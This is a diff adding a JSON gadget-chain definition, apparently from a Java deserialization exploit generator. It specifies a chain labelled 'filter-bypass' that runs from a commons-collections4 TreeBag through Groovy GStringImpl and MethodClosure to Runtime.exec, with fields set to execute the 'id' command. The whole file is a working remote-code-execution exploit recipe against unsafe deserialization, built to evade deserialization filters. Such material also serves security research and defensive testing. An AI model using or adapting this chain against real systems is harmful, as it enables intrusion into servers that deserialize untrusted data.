@@ -1,0 +1,25 @@
+{
+    "chain_type": "GroovyGStr_TreeBag — TreeBag + GStringImpl → MethodClosure.execute (filter-bypass)",
+    "root_class": "org.apache.commons.collections4.bag.TreeBag",
+    "root_trigger": "readObject→TreeMap.put→Comparator.compare→GStringImpl.hashCode→toString→writeTo→MethodClosure.call→execute",
+    "links": [
+        {
+            "class": "org.codehaus.groovy.runtime.GStringImpl",
+            "field_overrides": {
+                "values": [{"$ref": "link:1"}],
+                "strings": ["", ""]
+            }
+        },
+        {
+            "class": "org.codehaus.groovy.runtime.MethodClosure",
+            "field_overrides": {
+                "owner": "id",
+                "delegate": "id",
+                "method": "execute",
+                "maximumNumberOfParameters": 0,
+                "parameterTypes": []
+            }
+        }
+    ],
+    "sink_method": "Runtime.exec"
+}
